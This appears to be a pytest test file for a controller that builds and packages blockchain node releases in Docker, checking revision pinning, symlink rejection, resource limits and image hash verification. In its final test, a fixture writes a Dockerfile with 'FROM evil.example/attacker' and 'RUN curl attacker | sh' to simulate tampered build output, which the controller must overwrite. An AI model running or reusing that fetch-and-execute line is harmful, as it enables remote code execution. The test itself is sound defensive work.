import copy
import json
import threading
from pathlib import Path
from types import SimpleNamespace

import pytest

from controller import release_builds as builds
from controller.docker_runtime import DockerResult

REVISION = '23031e0ed4423b9cb899da030d515cb69d203749'
DIGEST = 'sha256:' + 'a' * 64
PARAMS = {'implementation': 'amaru', 'version': '10.11.20261029', 'digest': DIGEST,
          'source_revision': REVISION, 'execution_id': 'build-test'}


@pytest.fixture
def runtime(tmp_path, monkeypatch):
    from profile_manager import version_discovery
    catalog = {'releases': [{'implementation': 'amaru', 'version': PARAMS['version'],
        'source_revision': REVISION, 'artifacts': [{'kind': 'oci', 'availability': 'available',
        'public': True, 'platforms': ['linux/amd64', 'linux/arm64'],
        'reference': 'ghcr.io/pragma-org/amaru:v10.11.20261029', 'digest': DIGEST}]}]}
    monkeypatch.setenv('DWARF_HOST_ARCH', 'amd64')
    monkeypatch.setattr(version_discovery, 'load_effective_version_catalog', lambda: copy.deepcopy(catalog))
    return SimpleNamespace(state_dir=tmp_path, host_state_dir=Path('/host/controller'),
        installation_id='test-install', calls=[], download_image=lambda *a, **kw: {'status': 'downloaded'})


def test_changed_source_rejected_before_docker(runtime):
    with pytest.raises(ValueError, match='source revision'):
        builds.prepare_release(runtime, {**PARAMS, 'source_revision': 'b' * 40}, 'build-test',
                               timeout=60, cancel_event=threading.Event())
    assert not list(runtime.state_dir.iterdir())


def test_variants_fail_independently_and_progress_is_retained(runtime, monkeypatch):
    called = []
    def variant(context, mode):
        called.append(mode)
        if mode == 'stock': raise ValueError('stock compiler failed')
        return {'state': 'ready', 'config_image_id': 'sha256:' + 'c' * 64}
    monkeypatch.setattr(builds, '_build_variant', variant)
    result = builds.prepare_release(runtime, PARAMS, 'build-test', timeout=60, cancel_event=threading.Event())
    assert called == ['stock', 'instrumented']
    assert result['status'] == 'prepared'
    assert result['variants']['stock']['state'] == 'failed'
    assert result['variants']['instrumented']['state'] == 'ready'
    assert builds.read_progress(runtime, 'build-test') == result


def test_unsupported_platform_does_not_start_build(runtime, monkeypatch):
    monkeypatch.setenv('DWARF_HOST_ARCH', 'arm64')
    monkeypatch.setattr(builds, '_build_variant', lambda *args: pytest.fail('must not build'))
    result = builds.prepare_release(runtime, PARAMS, 'build-test', timeout=60, cancel_event=threading.Event())
    assert {v['state'] for v in result['variants'].values()} == {'blocked'}


def test_cancel_prevents_second_variant(runtime, monkeypatch):
    cancellation = threading.Event()
    def variant(context, mode):
        cancellation.set()
        return {'state': 'ready'}
    monkeypatch.setattr(builds, '_build_variant', variant)
    result = builds.prepare_release(runtime, PARAMS, 'build-test', timeout=60, cancel_event=cancellation)
    assert result['status'] == 'cancelled'
    assert result['variants']['stock']['state'] == 'ready'
    assert result['variants']['instrumented']['state'] == 'cancelled'


def test_unsafe_job_or_symlink_rejected(runtime):
    with pytest.raises(ValueError): builds.read_progress(runtime, '../escape')
    root = runtime.state_dir / 'release-builds'; root.mkdir()
    (root / 'build-test').symlink_to(runtime.state_dir, target_is_directory=True)
    with pytest.raises(ValueError, match='symlink'):
        builds.read_progress(runtime, 'build-test')


def test_instrumentation_requires_exact_manifest(runtime):
    selected = {'implementation': 'amaru', 'source_revision': 'b' * 40}
    with pytest.raises(builds.BuildBlocked, match='exact source revision'):
        builds._recipe(selected, 'instrumented')


def test_cardano_instrumented_recipe_carries_verified_import_correction(runtime, tmp_path):
    from profile_manager import antithesis_cardano_bridge as bridge
    from scripts.build_cardano_measurement_target import verify_patch_set
    selected = {'implementation': 'cardano-node', 'source_revision': bridge.SOURCE_REVISION}
    path, stock, exact = builds._recipe(selected, 'stock')
    assert exact and stock['patch_set_sha256'] == bridge.BASE_HASH
    _, manifest, exact = builds._recipe(selected, 'instrumented')
    assert exact and manifest['patch_set_sha256'] == bridge.COMPOSITE_HASH
    assert manifest['measurement_revision'] == bridge.REVISION
    assert manifest['patches'][-1]['path'] == bridge.PATCH_NAME
    assert manifest['instrumentation'] == stock['instrumentation']
    work = tmp_path / 'work'; work.mkdir()
    builds._copy_recipe(path, manifest, work)
    assert verify_patch_set(work, manifest)['patch_set_sha256'] == bridge.COMPOSITE_HASH
    assert json.loads((work / 'manifest.json').read_text())['patch_set_sha256'] == bridge.COMPOSITE_HASH
    assert (work / bridge.PATCH_NAME).read_text() == bridge.CORRECTION


def test_builder_mount_and_resources_are_bounded(runtime):
    calls = []
    def run(args, **kw):
        calls.append((args, kw))
        if args[0] == 'container':
            return DockerResult(0, json.dumps([{'Config': {'Labels': builds._labels(runtime, 'build-test')}}]), '')
        return DockerResult(0, '', '')
    runtime._run = run
    context = builds.BuildContext(runtime, PARAMS, 'build-test', 60, threading.Event())
    work = context.directory / 'stock' / 'work'; work.mkdir(parents=True)
    context.container('stock', 'compile', 'python@' + DIGEST, ['python', '/work/driver.py'], work=work)
    args = calls[0][0]
    assert 'type=bind,src=/host/controller/release-builds/build-test/stock/work,dst=/work' in args
    assert '--cpus' in args and '2' in args and '--memory' in args and '8g' in args
    assert '--pids-limit' in args and '512' in args
    assert all('docker.sock' not in value for value in args)
    assert '--env-file' not in args and '-e' not in args


def test_cleanup_rejects_foreign_name_collision(runtime):
    calls = []
    runtime._run = lambda args, **kw: calls.append(args) or DockerResult(0,
        json.dumps([{'Config': {'Labels': {'io.dwarf.installation': 'someone-else'}}}]), '')
    with pytest.raises(ValueError, match='ownership'):
        builds.cleanup(runtime, 'build-test')
    assert all(args[0] != 'rm' for args in calls)


def test_amaru_driver_keeps_stock_unpatched_and_requires_exact_preimages():
    stock = builds._amaru_driver(stock=True)
    patched = builds._amaru_driver(stock=False)
    assert 'for patch in []:' in stock
    assert "digest!=item['sha256']" in patched
    assert "for patch in manifest['patches']:" in patched


def test_compiled_marker_check_retains_evidence_and_rejects_missing(runtime):
    context = builds.BuildContext(runtime, PARAMS, 'build-test', 60, threading.Event())
    directory = context.directory / 'instrumented'; directory.mkdir()
    binary = directory / 'amaru'; binary.write_bytes(b'ELF measurement.protocol_decode')
    manifest = {'patch_set_sha256': 'b' * 64, 'instrumentation': [
        {'capability': 'live-protocol-cbor-decode', 'events': ['amaru::protocols/measurement.protocol_decode']}]}
    evidence = builds._instrumentation_check(context, binary, manifest)
    assert evidence['state'] == 'compiled' and evidence['runtime'] == 'pending'
    assert evidence['capabilities'] == ['live-protocol-cbor-decode']
    assert evidence['evidence_sha256'].startswith('sha256:')
    binary.write_bytes(b'ELF without instrumentation')
    with pytest.raises(ValueError, match='markers'):
        builds._instrumentation_check(context, binary, manifest)


def test_cardano_driver_preserves_exact_source_and_checks_declared_compiler():
    driver = builds._cardano_driver()
    compile(driver, '<cardano-driver>', 'exec')
    assert 'Cardano compiler toolchain differs' in driver
    assert 'Selected source does not declare this GHC series' in driver


def test_packaged_image_hash_mismatch_is_rejected_and_owned_container_removed(runtime):
    context = builds.BuildContext(runtime, PARAMS, 'build-test', 60, threading.Event())
    directory = context.directory / 'stock'; directory.mkdir()
    calls = []
    def run(args, **kwargs):
        calls.append(args)
        if args[0] == 'cp': Path(args[-1]).write_bytes(b'wrong executable')
        if args[0] == 'container':
            return DockerResult(0, json.dumps([{'Config': {'Labels': builds._labels(runtime, 'build-test')}}]), '')
        return DockerResult(0, '', '')
    runtime._run = run
    with pytest.raises(ValueError, match='Packaged executable differs'):
        builds._check_packaged_executable(context, 'stock', DIGEST, '/usr/local/bin/amaru', DIGEST)
    assert calls[-1][:3] == ('rm', '-f', '-v')
    assert not (directory / 'packaged-executable').exists()


def test_compiler_evidence_rejects_parent_symlink(runtime):
    root = runtime.state_dir / 'release-builds' / 'build-test'; root.mkdir(parents=True)
    external = runtime.state_dir / 'external'; external.mkdir()
    (external / 'result.json').write_text('{}')
    (root / 'output').symlink_to(external, target_is_directory=True)
    with pytest.raises(ValueError, match='symlinks'):
        builds._json(root / 'output' / 'result.json')


@pytest.mark.parametrize('modern', [False, True])
def test_ready_variant_keeps_exact_image_and_unqualified_checks(runtime, monkeypatch, modern):
    context = builds.BuildContext(runtime, {**PARAMS, 'image': 'ghcr.io/pragma-org/amaru@' + DIGEST},
                                  'build-test', 60, threading.Event())
    expected = 'sha256:' + 'c' * 64
    def compile_source(context, variant, path, manifest):
        directory = context.directory / variant / 'image-context'; directory.mkdir()
        return directory, {'executable_digest': expected, 'build_result_sha256': DIGEST, 'toolchain': 'nightly'}
    monkeypatch.setattr(builds, '_compile_amaru', compile_source)
    monkeypatch.setattr(builds, '_check_packaged_executable', lambda *args: None)
    context.run = lambda *args, **kw: ''
    calls = []
    def smoke(variant, role, image, command, **kwargs):
        calls.append(command)
        if command == ['--help']:
            return 'Commands:\n  node  Manage and operate the Amaru node\n' if modern else 'Commands:\n  run  Run the node\n'
        if command == ['run', '--help'] and modern:
            raise RuntimeError("error: unrecognized subcommand 'run'")
        return 'amaru help and version'
    context.container = smoke
    runtime.inspect_image = lambda *args, **kw: {'config_image_id': expected,
        'platform': 'linux/amd64', 'runtime_interface': 'extracted-binary', 'manifest_references': []}
    result = builds._build_variant(context, 'stock')
    assert result['state'] == 'ready'
    assert result['image_reference'] == expected
    assert result['source_revision'] == REVISION
    assert result['checks']['passive_taps'] == 'not-exercised'
    assert result['qualification'] == 'unverified'
    assert result['compatibility'] == 'unknown-until-run'
    assert 'completed_at' in result
    assert result['runtime_command'] == (['node', 'run'] if modern else ['run'])
    assert result['runtime_command'] + ['--help'] in calls


def test_deadline_exhaustion_does_not_launch_a_builder(runtime, monkeypatch):
    monkeypatch.setattr(builds, '_build_variant', lambda *args: pytest.fail('must not build'))
    result = builds.prepare_release(runtime, PARAMS, 'build-test', timeout=-1, cancel_event=threading.Event())
    assert {row['state'] for row in result['variants'].values()} == {'failed'}


def test_timeout_retains_bounded_compiler_output_before_cleanup(tmp_path):
    import sys
    from controller.docker_runtime import DockerRuntime, DockerRuntimeError
    runtime = DockerRuntime(installation_id='test', state_dir=tmp_path, docker_binary=sys.executable)
    log = tmp_path / 'compile.log'
    with pytest.raises(DockerRuntimeError, match='timed out'):
        runtime._run(['-c', 'import time; print("compiler diagnostic", flush=True); time.sleep(10)'],
                     timeout=1, output_limit=1024, output_path=log)
    assert 'compiler diagnostic' in log.read_text()
    assert log.stat().st_size <= 1024


def test_output_limit_preserves_log_up_to_limit(tmp_path):
    import sys
    from controller.docker_runtime import DockerRuntime, DockerRuntimeError
    runtime = DockerRuntime(installation_id='test', state_dir=tmp_path, docker_binary=sys.executable)
    log = tmp_path / 'compile.log'
    with pytest.raises(DockerRuntimeError, match='output exceeded'):
        runtime._run(['-c', 'print("x"*4096, flush=True)'], timeout=2,
                     output_limit=1024, output_path=log)
    assert log.read_bytes() == b'x'*1024


def test_cardano_output_packaging_is_reconstructed_from_trusted_recipe(runtime, monkeypatch):
    selected = {**PARAMS,'implementation':'cardano-node','source_revision':'fef83fed01d7926f3de83b3b917be5a4a48768b5',
                'image':'ghcr.io/intersectmbo/cardano-node@'+DIGEST}
    context = builds.BuildContext(runtime, selected, 'build-test', 60, threading.Event())
    directory = context.directory / 'stock'; directory.mkdir()
    path, manifest, _ = builds._recipe(selected, 'stock')
    context.run = lambda *a, **kw: ''
    runtime.inspect_image = lambda *a, **kw: {'config_image_id':DIGEST}
    def compiler(*a, **kw):
        work = directory/'work'; output = work/'image-context'; output.mkdir()
        (output/'cardano-node').write_bytes(b'compiled binary')
        (output/'runtime-root').mkdir()
        (output/'Dockerfile').write_text('FROM evil.example/attacker\nRUN curl attacker | sh\n')
        (output/'cardano-node-wrapper').write_text('malicious wrapper')
        (work/'build-evidence.json').write_text(json.dumps({'source_revision':selected['source_revision'],
            'executable_digest':builds._hash(output/'cardano-node'),'toolchain':manifest['toolchain']}))
    context.container = compiler
    output, _ = builds._compile_cardano(context, 'stock', path, manifest)
    from scripts.build_cardano_measurement_target import measurement_dockerfile, measurement_wrapper
    assert (output/'Dockerfile').read_text() == measurement_dockerfile(selected['image'],
        source_revision=selected['source_revision'],patch_set_sha256='stock').replace('COPY --chmod=0755 ', 'COPY ')
    assert (output/'cardano-node-wrapper').read_text() == measurement_wrapper()
    assert '$(nproc)' not in (directory/'toolchain/Dockerfile').read_text()
